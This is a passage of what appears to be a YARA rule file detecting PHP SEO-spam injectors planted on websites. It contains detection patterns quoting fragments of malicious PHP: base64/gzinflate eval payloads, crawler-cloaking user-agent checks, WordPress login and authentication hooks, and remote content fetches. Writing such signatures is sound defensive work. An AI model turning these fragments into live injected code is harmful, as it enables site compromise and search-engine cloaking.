        $trigger = "NXlXREpPZGxwSFZYQlBlVUZMSnlrcE93b0siKSk7IA=="
    condition:
        $trigger and PR01398
}

rule php_spamseo_injector_284 : spamseo
{
    strings:
        $trigger = "HZbFrsUIrkU/p6uUQZj0RmFmPJm0wsycr39XPbdkydtey"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR06545 : trigger
{
    strings:
        $ps0 = "base64_encode($useragent);"
    condition:
        $ps0
}

private rule PR06546 : trigger
{
    strings:
        $ps0 = "&UserAgent="
    condition:
        $ps0
}

rule php_spamseo_injector_285 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06545 and PR06546 and PR00507
}

private rule PR06547 : trigger
{
    strings:
        $ps0 = "str_replace(\"{manytext_bing}\",$"
    condition:
        $ps0
}

rule php_spamseo_injector_285_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR06547
}

private rule PR06548 : trigger
{
    strings:
        $ps0 = "else if(strpos($tmp, 'yahoo') !== false){"
    condition:
        $ps0
}

private rule PR06549 : trigger
{
    strings:
        $ps0 = ".str_replace(\" \",\"-\",$_GET[\"p\"]);"
    condition:
        $ps0
}

rule php_spamseo_injector_286 : spamseo
{
    strings:
        $trigger = "if(strpos($sitename, 'www') == false)"
    condition:
        $trigger and PR01401 and PR00113 and PR06548 and PR06549
}

private rule PR06550 : trigger
{
    strings:
        $ps0 = "function CreateLink($dir"
    condition:
        $ps0
}

private rule PR06551 : trigger
{
    strings:
        $ps0 = "$sourceBody"
    condition:
        $ps0
}

rule php_spamseo_injector_287 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR06550 and PR01021 and PR06551
}

private rule PR06552 : trigger
{
    strings:
        $ps0 = "),'tmp',0)>0)return 0;if($GLOBALS['_"
    condition:
        $ps0
}

rule php_spamseo_injector_288 : spamseo
{
    strings:
        $trigger = "<!-- <urls>"
    condition:
        $trigger and PR06552 and PR00265 and PR02163
}

private rule PR06553 : trigger
{
    strings:
        $ps0 = "<!-- <urls>"
    condition:
        $ps0
}

rule php_spamseo_injector_288_02 : spamseo
{
    strings:
        $trigger = "),\\'tmp\\',0)>0)return 0;if($GLOBALS[\\'_"
    condition:
        $trigger and PR00265 and PR02163 and PR06553
}

private rule PR06554 : trigger
{
    strings:
        $ps0 = "echo \"\\t\\t<td>$col_value</td>\\n\";"
    condition:
        $ps0
}

rule php_spamseo_injector_290 : spamseo
{
    strings:
        $trigger = "$link = mysql_connect("
    condition:
        $trigger and PR00732 and PR06554
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_292 : spamseo
{
    strings:
        $trigger = "file_get_contents"
        $php_spamseo_injector_292_r0 = /<\?php[\s]*echo[\s]*file_get_contents\(.https?:[^\?;]+\?url=.[\s]*\.\$_SERVER\[.HTTP_HOST.\][\s]*\.[\s]*\$_SERVER\[.REQUEST_URI.\]\);/
    condition:
        $trigger and PR02155 and $php_spamseo_injector_292_r0
}

private rule PR06555 : trigger
{
    strings:
        $ps0 = "$tlng"
    condition:
        $ps0
}

private rule PR06556 : trigger
{
    strings:
        $ps0 = "lnk"
    condition:
        $ps0
}

rule php_spamseo_injector_293 : spamseo
{
    strings:
        $trigger = "css"
    condition:
        $trigger and PR06555 and PR02548 and PR02549 and PR06556 and PR00265
}

private rule PR06557 : trigger
{
    strings:
        $ps0 = "define('_NET',$NET);"
    condition:
        $ps0
}

private rule PR06558 : trigger
{
    strings:
        $ps0 = "function get_cont($"
    condition:
        $ps0
}

rule php_spamseo_injector_293_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06557 and PR01021 and PR06558
}

private rule PR06559 : trigger
{
    strings:
        $ps0 = "}($xml_link);$google=@$_SERVER{"
    condition:
        $ps0
}

rule php_spamseo_injector_294 : spamseo
{
    strings:
        $trigger = ");exit;"
    condition:
        $trigger and PR06559 and PR00070
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_295 : spamseo
{
    strings:
        $trigger = "file_get_contents"
        $php_spamseo_injector_295_r0 = /function[\s]*[\w]*\(\)[\s]*\{[^\(]+if\(\$[\w]+[\s]*==[\s]*\$[\w]*\)\{[\s]*\$[\w]*[\s]*=[\s]*file_get_contents\(.[^\)]+\);[\s]*echo[\s]*\$[\w]*;/
    condition:
        $trigger and PR04411 and $php_spamseo_injector_295_r0
}

private rule PR06560 : trigger
{
    strings:
        $ps0 = "if (file_exists($cf) and filemtime($cf) > time() - 3600)"
    condition:
        $ps0
}

rule php_spamseo_injector_296 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06560 and PR00357
}

private rule PR06561 : trigger
{
    strings:
        $ps0 = "if(preg_match(\"/$truecref/i\",$crefs)){return"
    condition:
        $ps0
}

rule php_spamseo_injector_297 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR06561
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_298 : spamseo
{
    strings:
        $trigger = "<<<EOT"
        $php_spamseo_injector_298_r0 = /\$[\w]+[\s]*=[\s]*<<<EOT[\s]*<div>[\s]*<p>[\s]*(<a href[^\n]+\n){10,}<.p>[\s]*<.div>[\s]*EOT;[\s]*eval[^;]+\);/
    condition:
        $trigger and PR00029 and PR01422 and $php_spamseo_injector_298_r0
}

private rule PR06562 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL,str_rot13('ugg"
    condition:
        $ps0
}

rule php_spamseo_injector_299 : spamseo
{
    strings:
        $trigger = "preg_replace('/<body([^>]+)>/', '<body\\\\1>'.$server_output"
    condition:
        $trigger and PR06562
}

private rule PR06563 : trigger
{
    strings:
        $ps0 = "echo curl(str_rot13(\"ugg"
    condition:
        $ps0
}

rule php_spamseo_injector_300 : spamseo
{
    strings:
        $trigger = "function curl($"
    condition:
        $trigger and PR06563 and PR01599
}

rule php_spamseo_injector_301 : spamseo
{
    strings:
        $trigger = "if( !isset($local_array['hash']) || isset($local_array['hash']) && $local_array['hash'] != $hash_file )"
    condition:
        $trigger and PR00070
}

rule php_spamseo_injector_302 : spamseo
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48ZDR2IDRkPSJjcjV"
    condition:
        $trigger
}

rule php_spamseo_injector_303 : spamseo
{
    strings:
        $trigger = "<?php eval('?>'.base64_decode('Cjw/cGhwCiRjaCA9IGN1cmxfaW5pd"
    condition:
        $trigger
}

rule php_spamseo_injector_304 : spamseo
{
    strings:
        $trigger = "array('http' => array('method' => \"GET"
    condition:
        $trigger and PR00070
}

rule php_spamseo_injector_305 : spamseo
{
    strings:
        $trigger = "echo $content"
    condition:
        $trigger and PR02838 and PR00070
}

rule php_spamseo_injector_306 : spamseo
{
    strings:
        $trigger = "@end(explode("
    condition:
        $trigger and PR06211 and PR00070 and PR06212
}

private rule PR06564 : trigger
{
    strings:
        $ps0 = "].$http_type.$_SERVER[$GLOBALS{"
    condition:
        $ps0
}

rule php_spamseo_injector_307 : spamseo
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR06564
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_308 : spamseo
{
    strings:
        $trigger = "echo"
        $php_spamseo_injector_308_r0 = /\$file[\s]*=[\s]*file_get_contents\(.http[^\)]+\.txt.\);[\s]*echo[\s]*\$file;/
    condition:
        $trigger and PR01431 and $php_spamseo_injector_308_r0
}

rule php_spamseo_injector_309 : spamseo
{
    strings:
        $trigger = "error_reporting(0);if(isset($_COOKIE[\"ping\"])){@setcookie(\"pong\""
    condition:
        $trigger
}

private rule PR06565 : trigger
{
    strings:
        $ps0 = "if(stristr($_SERVER['HTTP_USER_AGENT'],'Googlebot')||stristr($_SERVER['HTTP_USER_AGENT'],'yahoo')||stristr"
    condition:
        $ps0
}

rule php_spamseo_injector_310 : spamseo
{
    strings:
        $trigger = "if(preg_match(\"/zh-cn"
    condition:
        $trigger and PR06565 and PR00070
}

private rule PR06566 : trigger
{
    strings:
        $ps0 = "(substr($_SERVER[\"REQUEST_URI"
    condition:
        $ps0
}

rule php_spamseo_injector_311 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04416 and PR06566
}

private rule PR06567 : trigger
{
    strings:
        $ps0 = "./*;*/"
    condition:
        $ps0
}

rule php_spamseo_injector_312 : spamseo
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR06567 and PR01335
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_313 : spamseo
{
    strings:
        $trigger = "file_get_contents"
        $php_spamseo_injector_313_r0 = /@ini_set\(.display_errors[^:]+file_get_contents\([^&]+\$_SERVER\[.REMOTE_ADDR.\]\.[^;]+str_replace/
    condition:
        $trigger and PR02155 and $php_spamseo_injector_313_r0
}

private rule PR06568 : trigger
{
    strings:
        $ps0 = "$content .= $line;"
    condition:
        $ps0
}

private rule PR06569 : trigger
{
    strings:
        $ps0 = "echo $content;"
    condition:
        $ps0
}

rule php_spamseo_injector_314 : spamseo
{
    strings:
        $trigger = "txt', 'r'))"
    condition:
        $trigger and PR06568 and PR06569
}

private rule PR06570 : trigger
{
    strings:
        $ps0 = "mb_strtolower($query_pars_2);"
    condition:
        $ps0
}

rule php_spamseo_injector_315 : spamseo
{
    strings:
        $trigger = "google.com/search"
    condition:
        $trigger and PR01401 and PR06570
}

private rule PR06571 : trigger
{
    strings:
        $ps0 = "if(_spider() && _main()) {"
    condition:
        $ps0
}

rule php_spamseo_injector_316 : spamseo
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR06571 and PR03964
}

private rule PR06572 : trigger
{
    strings:
        $ps0 = "<title><?php echo $keyword ?></title><meta id"
    condition:
        $ps0
}

rule php_spamseo_injector_317 : spamseo
{
    strings:
        $trigger = "<!-- DNN Platform"
    condition:
        $trigger and PR00039 and PR02056 and PR06572
}

private rule PR06573 : trigger
{
    strings:
        $ps0 = "(stristr($_SERVER['HTTP_USER_AGENT']"
    condition:
        $ps0
}

rule php_spamseo_injector_318 : spamseo
{
    strings:
        $trigger = "explode(\"###\",$"
    condition:
        $trigger and PR06573 and PR02062 and PR01021
}

rule php_spamseo_injector_319 : spamseo
{
    strings:
        $trigger = "DVY1EuTYEjzOzoQMYQvixxpibjE6G2Jm1ul/O896RmUlVBZn0v+p3mYs+2Qv"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_spamseo_injector_321 : spamseo
{
    strings:
        $trigger = "(implode('',$"
    condition:
        $trigger and PR01771 and PR00029 and PR01772
}

private rule PR06574 : trigger
{
    strings:
        $ps0 = "){print $c['body'];}}}function request($url){if"
    condition:
        $ps0
}

rule php_spamseo_injector_322 : spamseo
{
    strings:
        $trigger = "_COOKIE"
    condition:
        $trigger and PR06574
}

private rule PR06575 : trigger
{
    strings:
        $ps0 = "rVqJUttIGn4VxcWM7C0H+tDRHQI1siXtGDBkwUw2E1IuHS1sYmxjyQaz"
    condition:
        $ps0
}

rule php_spamseo_injector_323 : spamseo
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR06575 and PR00029
}

private rule PR06576 : trigger
{
    strings:
        $ps0 = "<?php if(preg_match('/robo|bot|crawl|spider|slurp|scooter/i',$_SERVER['HTTP_USER_AGENT']) and !preg_match"
    condition:
        $ps0
}

rule php_spamseo_injector_324 : spamseo
{
    strings:
        $trigger = "<?php endif; ?>"
    condition:
        $trigger and PR06576
}

rule php_spamseo_injector_325 : spamseo
{
    strings:
        $trigger = "base64_encode(time().':;:'.$_POST['log'].':;:"
    condition:
        $trigger and PR00039 and PR02056 and PR01788
}

private rule PR06577 : trigger
{
    strings:
        $ps0 = "rRlrc5tI8q8QhzVoFyHQGzvYSSXKozZxfLZ8e1U"
    condition:
        $ps0
}

rule php_spamseo_injector_326 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06577
}

private rule PR06578 : trigger
{
    strings:
        $ps0 = "]}));}return(function_exists(${$"
    condition:
        $ps0
}

rule php_spamseo_injector_327 : spamseo
{
    strings:
        $trigger = "]}=@fsockopen(${$"
    condition:
        $trigger and PR06578 and PR03964 and PR04718
}

private rule PR06579 : trigger
{
    strings:
        $ps0 = "echo \"<!--/google-->\";"
    condition:
        $ps0
}

private rule PR06580 : trigger
{
    strings:
        $ps0 = "|google|yandex/i', $_SERVER['HTTP_USER_AGENT']))"
    condition:
        $ps0
}

rule php_spamseo_injector_328 : spamseo
{
    strings:
        $trigger = "echo \"<!--google->\";"
    condition:
        $trigger and PR00092 and PR06579 and PR06580
}

rule php_spamseo_injector_329 : spamseo
{
    strings:
        $trigger = "@$indexx=\"c"
    condition:
        $trigger and PR00092
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_330 : spamseo
{
    strings:
        $trigger = "echo"
        $php_spamseo_injector_330_r0 = /<\?php \$GLOBALS\[[^\]]+\][\s]*=[\s]*Array\([^\)]+\);[\s]*\?>[\s]*<\?php[\s]*function[\s]*[\w]+\(\$[\w]+\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*Array[^\)]+\);[\s]*return base64_decode\(\$.\[\$.\]\);\}[\s]*\?>/
    condition:
        $trigger and PR01545 and PR01479 and $php_spamseo_injector_330_r0
}

private rule PR06581 : trigger
{
    strings:
        $ps0 = "$spath = $_GET['start'];"
    condition:
        $ps0
}

private rule PR06582 : trigger
{
    strings:
        $ps0 = "$host = $lhost[rand(0,(count($lhost)-1))];"
    condition:
        $ps0
}

rule php_spamseo_injector_331 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06581 and PR06582
}

private rule PR06583 : trigger
{
    strings:
        $ps0 = "FZZFssUIkgSP01WmhZisbRZi6YkZNmNiZtbp58"
    condition:
        $ps0
}

rule php_spamseo_injector_332 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06583
}

rule php_spamseo_injector_333 : spamseo
{
    strings:
        $trigger = "if(strpos($all,\"ja\")>-1 && (strpos($s_ref,\"jp\")>0 || strpos($s_ref,\"yahoo"
    condition:
        $trigger and PR00042
}

private rule PR06584 : trigger
{
    strings:
        $ps0 = "trim(urldecode(base64_decode(trim(@$_GET["
    condition:
        $ps0
}

rule php_spamseo_injector_334 : spamseo
{
    strings:
        $trigger = "$ads = trim(base64_decode(file_get_contents('http"
    condition:
        $trigger and PR06584
}

private rule PR06585 : trigger
{
    strings:
        $ps0 = "],\\'request_url\\'=>$params[\"\\x"
    condition:
        $ps0
}

rule php_spamseo_injector_335 : spamseo
{
    strings:
        $trigger = "[\"data\"];die();}');${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR06585 and PR00719
}

rule php_spamseo_injector_336 : spamseo
{
    strings:
        $trigger = "$link = base64_encode($_SERVER[\"SCRIPT_NAME\"].\"?down\".md5(time()));"
    condition:
        $trigger and PR00042 and PR00444
}

private rule PR06586 : trigger
{
    strings:
        $ps0 = "PFx2Sv86UTJGK5hCt7ozfCGlCqOtrXdd6sJQ8dH+Ympkta0+vP/q"
    condition:
        $ps0
}

rule php_spamseo_injector_337 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06586
}

private rule PR06587 : trigger
{
    strings:
        $ps0 = "pTtrc5vIsn+FKGyAXY"
    condition:
        $ps0
}

rule php_spamseo_injector_338 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06587
}

private rule PR06588 : trigger
{
    strings:
        $ps0 = "($db == true) { echo file_get_contents_utf8(\"\\x"
    condition:
        $ps0
}

rule php_spamseo_injector_339 : spamseo
{
    strings:
        $trigger = "$value) { if (strpos($visitor, $value) !== false)"
    condition:
        $trigger and PR06588 and PR01428
}

private rule PR06589 : trigger
{
    strings:
        $ps0 = "getHtml(base64_decode("
    condition:
        $ps0
}

rule php_spamseo_injector_340 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01553 and PR06589 and PR01350
}

rule php_spamseo_injector_341 : spamseo
{
    strings:
        $trigger = "$content = file_get_contents(\"http://"
    condition:
        $trigger and PR06509 and PR04962
}

rule php_spamseo_injector_343 : spamseo
{
    strings:
        $trigger = ",$_SERVER['HTTP_USER_AGENT'])){echo \"<a href="
    condition:
        $trigger and PR06083
}

private rule PR06590 : trigger
{
    strings:
        $ps0 = "(\"PGh0bWw+PGJvZHkgc3R5bGU9ImJhY2tncm91bmQt"
    condition:
        $ps0
}

rule php_spamseo_injector_344 : spamseo
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR06590 and PR01877
}

rule php_spamseo_injector_346 : spamseo
{
    strings:
        $trigger = "$result = $wp_boss->request(\"/api/\""
    condition:
        $trigger and PR01480
}

// MANUAL FIX NECESSARY
private rule PR06591 : trigger
{
    strings:
        $ps0 = "$wp_boss->request"
    condition:
        $ps0
}

rule php_spamseo_injector_346_02 : spamseo
{
    strings:
        $trigger = "str_replace"
        $php_spamseo_injector_346_02_r0 = /require __DIR__ \. ..wp-blog-header.php.;[\s]*\}/
    condition:
        $trigger and PR06591 and $php_spamseo_injector_346_02_r0
}

rule php_spamseo_injector_347 : spamseo
{
    strings:
        $trigger = "function Go($url){ $ch = curl_init(); $ip = rand(0,255).\".\".rand(0,255).\".\".rand(0,255).\".\".rand(0,255) ; $timeout"
    condition:
        $trigger and PR01553 and PR01401
}

rule php_spamseo_injector_347_02 : spamseo
{
    strings:
        $trigger = "function authcode($string, $operation = \"DECODE\", $key"
    condition:
        $trigger and PR01553 and PR01401
}

private rule PR06592 : trigger
{
    strings:
        $ps0 = "$Link_Id = $_Post_Th . $_Post_Ts . ':' . '//' . $_Post_Wi . $_Post_In . $_Post_404;"
    condition:
        $ps0
}

rule php_spamseo_injector_348 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06592 and PR01431
}

rule php_spamseo_injector_349 : spamseo
{
    strings:
        $trigger = "%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%"
    condition:
        $trigger and PR01756
}

private rule PR06593 : trigger
{
    strings:
        $ps0 = "</body>', $html);"
    condition:
        $ps0
}

private rule PR06594 : trigger
{
    strings:
        $ps0 = "$html = ob_get_clean();"
    condition:
        $ps0
}

rule php_spamseo_injector_350 : spamseo
{
    strings:
        $trigger = "$html = str_replace('</body>',"
    condition:
        $trigger and PR06593 and PR06381 and PR06594
}

private rule PR06595 : trigger
{
    strings:
        $ps0 = "ob_start();"
    condition:
        $ps0
}

rule php_spamseo_injector_350_02 : spamseo
{
    strings:
        $trigger = "$html = str_replace('</body>',"
    condition:
        $trigger and PR06595 and PR06381 and PR06594
}

private rule PR06596 : trigger
{
    strings:
        $ps0 = "implode(\"\", array("
    condition:
        $ps0
}

rule php_spamseo_injector_350_03 : spamseo
{
    strings:
        $trigger = "$html = str_replace('</body>',"
    condition:
        $trigger and PR06596 and PR06381 and PR06594
}

private rule PR06597 : trigger
{
    strings:
        $ps0 = "echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;"
    condition:
        $ps0
}

rule php_spamseo_injector_351 : spamseo
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $trigger and PR00435 and PR06597
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_351_02 : spamseo
{
    strings:
        $trigger = "LCAgc3RycG9zKCRjb250ZW50LCAkYikgLCAxMDAwMDAwMDAwMCk7DQoNCg0KDQoNCiAgICAgICAgICAgaWYgKHN0cmxlbigkYSk+NikgIGl"
        $php_spamseo_injector_351_02_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_spamseo_injector_351_02_r0
}

private rule PR06598 : trigger
{
    strings:
        $ps0 = "document.write(unescape('%3Ctitle%3E%"
    condition:
        $ps0
}

rule php_spamseo_injector_353 : spamseo
{
    strings:
        $trigger = "value=\"<?php echo $"
    condition:
        $trigger and PR06598 and PR00050
}

rule php_spamseo_injector_354 : spamseo
{
    strings:
        $trigger = "\\x65\\x76\\x61\\x6c\\x28\\x67\\x7a\\x75\\x6e\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73"
    condition:
        $trigger
}

private rule PR06599 : trigger
{
    strings:
        $ps0 = "[*^_^*]'.$shao_pass;"
    condition:
        $ps0
}

rule php_spamseo_injector_355 : spamseo
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR06599 and PR01480
}

rule php_spamseo_injector_356 : spamseo
{
    strings:
        $trigger = "ba'.'se'. 32*2"
    condition:
        $trigger and PR04411
}

private rule PR06600 : trigger
{
    strings:
        $ps0 = "if (preg_match('#<a"
    condition:
        $ps0
}

rule php_spamseo_injector_357 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR06600
}

private rule PR06601 : trigger
{
    strings:
        $ps0 = ")&&strcasecmp(getenv("
    condition:
        $ps0
}

rule php_spamseo_injector_358 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06601 and PR00113 and PR01428 and PR01021
}

private rule PR06602 : trigger
{
    strings:
        $ps0 = "substr(str_shuffle($mix_strs),mt_rand(0,strlen($"
    condition:
        $ps0
}

rule php_spamseo_injector_359 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR01428 and PR06602 and PR01021
}

private rule PR06603 : trigger
{
    strings:
        $ps0 = "\\x27\".'aWYoIW"
    condition:
        $ps0
}

rule php_spamseo_injector_360 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06603
}

private rule PR06604 : trigger
{
    strings:
        $ps0 = "echo $veri;"
    condition:
        $ps0
}

rule php_spamseo_injector_361 : spamseo
{
    strings:
        $trigger = "$veri = curl_exec($ch);"
    condition:
        $trigger and PR01428 and PR06604
}

private rule PR06605 : trigger
{
    strings:
        $ps0 = ", 'wp_footer'), -2000);"
    condition:
        $ps0
}

rule php_spamseo_injector_364 : spamseo
{
    strings:
        $trigger = "$html = ob_get_clean();"
    condition:
        $trigger and PR06605 and PR01480 and PR06381
}

private rule PR06606 : trigger
{
    strings:
        $ps0 = "$ua2=mb_strtolower($_SERVER['HTTP_USER_AGENT'],\"UTF-8\");"
    condition:
        $ps0
}

private rule PR06607 : trigger
{
    strings:
        $ps0 = "elseif (strrpos($ua2, \"mobile\") == true || strrpos($ua2, \"google\") == true || strrpos"
    condition:
        $ps0
}

rule php_spamseo_injector_365 : spamseo
{
    strings:
        $trigger = "$ua=$_SERVER['HTTP_USER_AGENT'];"
    condition:
        $trigger and PR06606 and PR06607
}

rule php_spamseo_injector_366 : spamseo
{
    strings:
        $trigger = "$icerik = file_get_contents($site);"
    condition:
        $trigger
}

private rule PR06608 : trigger
{
    strings:
        $ps0 = "(file_exists('.htaccess')) {"
    condition:
        $ps0
}

private rule PR06609 : trigger
{
    strings:
        $ps0 = "mod_rewrite.c>\\r\\n\\t"
    condition:
        $ps0
}

rule php_spamseo_injector_367 : spamseo
{
    strings:
        $trigger = "file_get_contents("
    condition:
        $trigger and PR06608 and PR03964 and PR06609
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_368 : spamseo
{
    strings:
        $trigger = "eval(pack('H*','20247471687078613d277471687078273b66756e6374696f6e206"
        $php_spamseo_injector_368_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and $php_spamseo_injector_368_r0
}

private rule PR06610 : trigger
{
    strings:
        $ps0 = ",chr(base_convert($"
    condition:
        $ps0
}

rule php_spamseo_injector_369 : spamseo
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01553 and PR01498 and PR06610
}

private rule PR06611 : trigger
{
    strings:
        $ps0 = "if($url_current =="
    condition:
        $ps0
}

rule php_spamseo_injector_370 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR02196 and PR04411 and PR06611
}

// MANUAL FIX NECESSARY
rule php_spamseo_injector_371 : spamseo
{
    strings:
        $trigger = "FZe3roXalkT/5UX3igDv1HoB3ntP0sJ7z8Z9fZ/OQazFrFk1qrqy8Z/m6+Z6zM7qnzw7KgL737IqlrL65z9iWsHHEWpjE4NrhqLOkiXJpB"
        $php_spamseo_injector_371_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_spamseo_injector_371_r0
}

private rule PR06612 : trigger
{
    strings:
        $ps0 = "32*2"
    condition:
        $ps0
}

private rule PR06613 : trigger
{
    strings:
        $ps0 = "PGRpdiBjbGFzcz0iY3hzeCI+PGEgaHJl"
    condition:
        $ps0
}

rule php_spamseo_injector_372 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06612 and PR06613
}

private rule PR06614 : trigger
{
    strings:
        $ps0 = "echo $link;"
    condition:
        $ps0
}

private rule PR06615 : trigger
{
    strings:
        $ps0 = "if($bot == 1){"
    condition:
        $ps0
}

private rule PR06616 : trigger
{
    strings:
        $ps0 = "if (isBotes()) {"
    condition:
        $ps0
}

rule php_spamseo_injector_373 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06614 and PR06615 and PR06616 and PR01569
}

private rule PR06617 : trigger
{
    strings:
        $ps0 = "YSBQb3Rvbmdhbi48L3NwYW4+PC9jZW50ZXI+CjwvZGl2Pgo8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="
    condition:
        $ps0
}

rule php_spamseo_injector_374 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01479 and PR06617
}

private rule PR06618 : trigger
{
    strings:
        $ps0 = "() {if (current_user_can('administrator') || current_user_can('editor')) return; ?><div class=\""
    condition:
        $ps0
}

rule php_spamseo_injector_375 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR06618 and PR04411
}

rule php_spamseo_injector_376 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04041 and PR01428 and PR01021
}

private rule PR06619 : trigger
{
    strings:
        $ps0 = "DVbFrsUKDvuceU9dlEmzKjPj6"
    condition:
        $ps0
}

rule php_spamseo_injector_377 : spamseo
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR06619
}

private rule PR06620 : trigger
{
    strings:
        $ps0 = "= \"./{$requested_url}.log\";"
    condition:
        $ps0
}

rule php_spamseo_injector_378 : spamseo
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR01480 and PR01468 and PR06620
}

private rule PR06621 : trigger
{
    strings:
        $ps0 = "add_action( 'wp_authenticate', function("
    condition:
        $ps0
}

rule php_spamseo_injector_379 : spamseo
{
    strings:
        $trigger = "str_ireplace('html','contents',"
    condition:
        $trigger and PR01480 and PR06621
}

rule php_spamseo_injector_380 : spamseo
{
    strings:
        $trigger = "].$_SERVER['REQUEST_URI'];if(strpos($url,'/wp-login.php')!==false)if(!isset($_COOKIE"
    condition:
        $trigger
}

rule php_spamseo_injector_380_02 : spamseo
{
    strings:
        $trigger = "*/eval(chr(36).chr(100).chr(61).chr(115).chr(121).chr(115).chr(95).chr(103).chr(101).chr(116).chr(95).chr(116).chr(101)"
    condition:
        $trigger
}

private rule PR06622 : trigger
{
    strings:
        $ps0 = "echo preg_replace(array('/(src=)"
    condition:
        $ps0
}

private rule PR06623 : trigger
{
    strings:
        $ps0 = "),array(\"$1$2$url$5$6\",\"$1$2$url$5$6\"),$newSite);"
    condition:
        $ps0
}

rule php_spamseo_injector_381 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06622 and PR06623
}

private rule PR06624 : trigger
{
    strings:
        $ps0 = "preg_replace('/.+\\.php/',"
    condition:
        $ps0
}

rule php_spamseo_injector_382 : spamseo
{
    strings:
        $trigger = "$dir/\".md5($_SERVER['REQUEST_URI']).\".html\";"
    condition:
        $trigger and PR06624 and PR01458
}

private rule PR06625 : trigger
{
    strings:
        $ps0 = "$wp_hook = $hook_action($license);"
    condition:
        $ps0
}

private rule PR06626 : trigger
{
    strings:
        $ps0 = "echo $response;"
    condition:
        $ps0
}

rule php_spamseo_injector_383 : spamseo
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR06625 and PR06626
}

rule php_spamseo_injector_384 : spamseo
{
    strings:
        $trigger = "'?file='.$_GET['id'].'.txt"
    condition:
        $trigger and PR01780
}

private rule PR06627 : trigger
{
    strings:
        $ps0 = ". \"','first_name','admin'),(null,'\" ."
    condition:
        $ps0
}

rule php_spamseo_injector_384_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06627 and PR01468 and PR02221 and PR01899
}

private rule PR06628 : trigger
{
    strings:
        $ps0 = "function getCurl($url)"
    condition:
        $ps0
}

rule php_spamseo_injector_385 : spamseo
{
    strings:
        $trigger = "$file = file_get_contents(\"https:"
    condition:
        $trigger and PR02492 and PR06628
}

rule php_spamseo_injector_386 : spamseo
{
    strings:
        $trigger = "$promoDomain = file_get_contents(\"/tmp/$domain.tmp\");"
    condition:
        $trigger and PR01428 and PR01021
}

private rule PR06629 : trigger
{
    strings:
        $ps0 = "(ini_get('open_basedir') == '' && ini_get('safe_mode' == 'Off'))"
    condition:
        $ps0
}

rule php_spamseo_injector_387 : spamseo
{
    strings:
        $trigger = "eval(\"?>\"."
    condition:
        $trigger and PR01431 and PR06629
}

private rule PR06630 : trigger
{
    strings:
        $ps0 = "lVPRbtowFH0uEv"
    condition:
        $ps0
}

rule php_spamseo_injector_388 : spamseo
{
    strings:
